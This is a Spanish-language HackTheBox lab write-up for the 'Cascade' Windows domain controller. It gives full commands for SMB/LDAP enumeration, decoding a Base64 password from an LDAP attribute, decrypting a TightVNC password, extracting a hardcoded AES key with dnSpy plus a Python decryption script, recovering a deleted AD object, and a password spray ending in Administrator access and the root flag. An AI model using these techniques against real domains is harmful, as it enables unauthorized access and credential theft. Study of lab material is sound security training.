---
icon: windows
tags:
  - reversing
  - ldap
  - smb
  - kerberos
  - active-directory
---

# Cascade

### Resumen

#### Detalles

| Campo                 | Detalle       |
| --------------------- | ------------- |
| **Nombre**            | Cascade       |
| **Sistema Operativo** | Windows       |
| **Plataforma**        | HackTheBox    |
| **Fecha**             | 22/11/2026    |
| **IP Objetivo**       | 10.129.90.135 |

#### Executive Summary

La máquina **Cascade** es un Controlador de Dominio de Active Directory comprometido mediante una cadena de credenciales expuestas en distintos niveles del entorno. La enumeración sin autenticar vía SMB y LDAP reveló un atributo personalizado (`cascadeLegacyPwd`) en el objeto de `r.thompson` con una contraseña codificada en Base64.

Con esas credenciales se accedió al recurso `Data`, donde se encontraron notas internas que mencionaban una cuenta temporal (`TempAdmin`) con la misma contraseña que el administrador, y un fichero de registro de TightVNC con la contraseña cifrada de `s.smith` (cifrado reversible de TightVNC). Con `s.smith` se obtuvo acceso por WinRM y, desde ahí, al recurso `Audit$`, que contenía un binario .NET (`CascAudit.exe`) y su librería de cifrado (`CascCrypto.dll`). Al desensamblarlos se extrajo la clave y el IV de un cifrado AES hardcodeado, lo que permitió descifrar la contraseña de `ArkSvc` almacenada en una base de datos SQLite.

Como `ArkSvc`, con permisos sobre la papelera de reciclaje de AD, se recuperó un objeto `TempAdmin` eliminado con su propio atributo `cascadeLegacyPwd`, confirmando lo visto en las notas internas: la contraseña correspondía al **Administrator** del dominio.

**Impacto:** compromiso total del dominio, por reutilización sistemática de credenciales y almacenamiento inseguro de contraseñas (texto cifrado con claves hardcodeadas, atributos LDAP personalizados sin proteger).

#### Técnicas

* SMB Enumeration
* RPC Enumeration
* LDAP Attribute Abuse (atributo `cascadeLegacyPwd`)
* Credential Reuse
* Reversible Encryption Abuse (TightVNC)
* .NET Reverse Engineering (dnSpy)
* AES Decryption (clave e IV hardcodeados)
* AD Recycle Bin Abuse

### Information Gathering

#### Port Scanning

**TCP**

| Puerto   | Servicio     | Versión                                             |
| -------- | ------------ | --------------------------------------------------- |
| 53/tcp   | domain       | Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1) |
| 88/tcp   | kerberos-sec | Microsoft Windows Kerberos                          |
| 135/tcp  | msrpc        | Microsoft Windows RPC                               |
| 139/tcp  | netbios-ssn  | Microsoft Windows netbios-ssn                       |
| 389/tcp  | ldap         | Active Directory LDAP (Domain: cascade.local)       |
| 445/tcp  | microsoft-ds | —                                                   |
| 3268/tcp | ldap         | Active Directory LDAP (Global Catalog)              |
| 5985/tcp | http         | Microsoft HTTPAPI httpd 2.0 (WinRM)                 |

Puertos suficientes para confirmar que es un Domain Controller de `cascade.local`.

#### Enumeration

**SMB / RPC (sin autenticar)**

Se comprobó sesión nula y se enumeraron usuarios:

```bash
> nxc smb 10.129.90.135 -u '' -p '' --users

CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
```

El acceso a shares con sesión nula o `guest` fue denegado. Con `rpcclient -U '%'` se obtuvieron los nombres completos de cada cuenta y los grupos de dominio existentes (`querydispinfo`, `enumdomgroups`), útiles para correlacionar usuarios con nombre real más adelante.

Se intentó AS-REP Roasting contra la lista completa de usuarios: ningún usuario tenía `UF_DONT_REQUIRE_PREAUTH` activado, por lo que esta vía no era explotable.

**LDAP**

La política de contraseñas mostró un dato relevante para más tarde:

```bash
> nxc ldap 10.129.90.135 --pass-pol
Minimum password length: 5
Account Lockout Threshold: 0
```

Umbral de bloqueo en 0 = sin bloqueo de cuentas, lo que permite más adelante un spray de credenciales sin riesgo de lockout.

Enumerando el árbol LDAP completo con `windapsearch` y revisando manualmente la salida, se localizó en el objeto de `r.thompson` un atributo no estándar:

```
cascadeLegacyPwd: clk0bjVldmE=
```

&#x20;

<figure><img src="../../../.gitbook/assets/Atributo cascadeLegacyPwd en el objeto LDAP de r.thompson.webp" alt="" width="563"><figcaption></figcaption></figure>

_Atributo cascadeLegacyPwd en el objeto LDAP de r.thompson_

```bash
> echo "clk0bjVldmE=" | base64 -d
rY4n5eva
```

### Explotación

#### Foothold

* **Vulnerabilidad:** Exposición de credenciales en atributo LDAP personalizado + reutilización de credenciales (VNC → cuenta de dominio).
* **Exploit:** enumeración LDAP manual, `smbmap`, decodificación Base64, decodificador de contraseña TightVNC.
* **Procedimiento:**

1. Con la contraseña recuperada del atributo LDAP, se validó `r.thompson`:

```bash
> nxc smb 10.129.90.176 -u 'r.thompson' -p 'rY4n5eva'
[+] cascade.local\r.thompson:rY4n5eva
```

2. El listado de shares mostró acceso de lectura al recurso `Data`:

```bash
> nxc smb 10.129.90.176 -u 'r.thompson' -p 'rY4n5eva' --shares
Data            READ
```

3. Enumerando `Data` con `smbmap` se localizó `IT\Email Archives\Meeting_Notes_June_2018.html`, con una nota interna que menciona una cuenta temporal para una migración de red:

```
Username is TempAdmin (password is the same as the normal admin account password).
```

&#x20;

<figure><img src="../../../.gitbook/assets/Meeting_Notes_June_2018.html mencionando la cuenta TempAdmin.webp" alt="" width="563"><figcaption></figcaption></figure>

_Meeting\_Notes\_June\_2018.html mencionando la cuenta TempAdmin_

4. En la misma ruta (`Data\IT\Temp\s.smith\`) se encontró `VNC Install.reg`, con la contraseña de TightVNC cifrada en el registro:

```
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

&#x20;

<figure><img src="../../../.gitbook/assets/VNC Install.reg con la contraseña de TightVNC cifrada en hexadecimal.webp" alt="" width="563"><figcaption></figcaption></figure>

_VNC Install.reg con la contraseña de TightVNC cifrada en hexadecimal_

5. El cifrado de contraseña de TightVNC usa una clave fija conocida; se descifró con una herramienta online:

```
6bcf2a4b6e5aca0f → sT333ve2
```

&#x20;

<figure><img src="../../../.gitbook/assets/Descifrado de la contraseña TightVNC con KeyDecryptor.webp" alt=""><figcaption></figcaption></figure>

_Descifrado de la contraseña TightVNC con KeyDecryptor_

6. Cruzando nombres completos obtenidos antes por `rpcclient`, se confirmó que esa contraseña corresponde a `s.smith` (Steve Smith). Se validó el acceso, con éxito también por WinRM:

```bash
> nxc smb 10.129.90.190 -u 's.smith' -p 'sT333ve2'
[+] cascade.local\s.smith:sT333ve2

> nxc winrm 10.129.90.190 -u 's.smith' -p 'sT333ve2'
[+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
```

* **Evidencia:** _(pendiente — añadir captura de `user.txt` leído desde la sesión de `s.smith`)_.

#### Privesc

* **Vulnerabilidad:** Credenciales hardcodeadas en software interno (.NET) + abuso de la papelera de reciclaje de Active Directory sobre un objeto eliminado con contraseña heredada.
* **Exploit:** `dnSpy`, `sqlitebrowser`, script Python con `pyaes`, `Get-ADObject -IncludeDeletedObjects`.
* **Procedimiento:**

1. Desde la sesión de `s.smith` se recolectó información de AD para BloodHound (ShadowHound-DS, rusthound-ce) y, en paralelo, se enumeraron los shares con las nuevas credenciales, revelando acceso de lectura adicional a `Audit$`:

```bash
> smbmap -H 10.129.90.190 -u 's.smith' -p 'sT333ve2' -r Audit$ --depth 10
CascAudit.exe
CascCrypto.dll
DB/Audit.db
RunAudit.bat
```

2. Descompilando `CascAudit.exe` con dnSpy se vio que lee una tabla `Ldap` de una base SQLite y descifra la columna `Pwd` con una clave hardcodeada:

```csharp
password = Crypto.DecryptString(text3, "c4scadek3y654321");
```

&#x20;

<figure><img src="../../../.gitbook/assets/CascAudit.exe descompilado en dnSpy clave AES hardcodeada.webp" alt=""><figcaption></figcaption></figure>

_CascAudit.exe descompilado en dnSpy: clave AES hardcodeada_

3. Abriendo `Audit.db` con `sqlitebrowser`, la tabla `Ldap` contenía:

```
uname: ArkSvc
pwd:   BQO5l5Kj9MdErXx6Q6AGOw==
domain: cascade.local
```

&#x20;

<figure><img src="../../../.gitbook/assets/Tabla Ldap de Audit.db vista con sqlitebrowser.webp" alt="" width="525"><figcaption></figcaption></figure>

_Tabla Ldap de Audit.db vista con sqlitebrowser_

4. Descompilando también `CascCrypto.dll` se confirmó el algoritmo (AES-CBC, keysize 128) y el IV fijo:

```csharp
public const string DefaultIV = "1tdyjCbY1Ix49842";
```

&#x20;

<figure><img src="../../../.gitbook/assets/CascCrypto.dll descompilado IV de AES hardcodeado.webp" alt="" width="563"><figcaption></figcaption></figure>

_CascCrypto.dll descompilado: IV de AES hardcodeado_

5. Con clave e IV conocidos, se descifró la contraseña con un script propio:

```python
import pyaes, base64

key = b'c4scadek3y654321'
iv  = b'1tdyjCbY1Ix49842'
ciphertext = base64.b64decode(b'BQO5l5Kj9MdErXx6Q6AGOw==')

decrypter = pyaes.AESModeOfOperationCBC(key, iv)
print(decrypter.decrypt(ciphertext).decode('utf-8'))
```

```bash
> python3 aes-decrypter.py
w3lc0meFr31nd
```

6. Acceso como `ArkSvc`:

```bash
> evil-winrm -i 10.129.90.190 -u 'ArkSvc' -p 'w3lc0meFr31nd'
```

7. Desde esta sesión se consultaron los objetos eliminados de AD, recuperando la cuenta `TempAdmin` mencionada en las notas internas:

```powershell
> Get-ADObject -Filter {Deleted -eq $true} -IncludeDeletedObjects
```

&#x20;

<figure><img src="../../../.gitbook/assets/Objeto eliminado TempAdmin recuperado de la papelera de reciclaje de AD.webp" alt="" width="563"><figcaption></figcaption></figure>

_Objeto eliminado TempAdmin recuperado de la papelera de reciclaje de AD_

```powershell
> Get-ADObject -Filter {Deleted -eq $true} -IncludeDeletedObjects -Properties *
```

&#x20;

<figure><img src="../../../.gitbook/assets/Propiedades completas del objeto TempAdmin eliminado, con cascadeLegacyPwd.webp" alt="" width="563"><figcaption></figcaption></figure>

_Propiedades completas del objeto TempAdmin eliminado, con cascadeLegacyPwd_

```
Name: TempAdmin
cascadeLegacyPwd: YmFDVDNyMWFOMDBkbGVz
```

8. Decodificando el atributo y confirmando lo indicado en la nota de reunión (TempAdmin comparte contraseña con el administrador), se realizó spray contra la lista de usuarios conocida:

```bash
> echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d
baCT3r1aN00dles

> nxc smb 10.129.90.190 -u users.txt -p passwords.txt
[+] cascade.local\Administrator:baCT3r1aN00dles (Pwn3d!)
```

9. Acceso como `Administrator` por WinRM y lectura de la flag de root.

* **Evidencia:** (`root.txt`)

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> type "C:/Users/Administrator/Desktop/root.txt"
72eff60e9c3f07a7621ff41ef276698a
```

&#x20;

<figure><img src="../../../.gitbook/assets/Lectura de root.txt como Administrator vía evil-winrm.webp" alt="" width="563"><figcaption></figcaption></figure>

_Lectura de root.txt como Administrator vía evil-winrm_

***

#### Notes

* La IP del objetivo cambió durante el laboratorio: `10.129.90.135` → `10.129.90.176` → `10.129.90.190`. Ajustar comandos a la IP activa.
* `Account Lockout Threshold: 0` detectado en la política de contraseñas: sin ese dato, el spray final contra `users.txt`/`passwords.txt` sería más arriesgado.

```
```
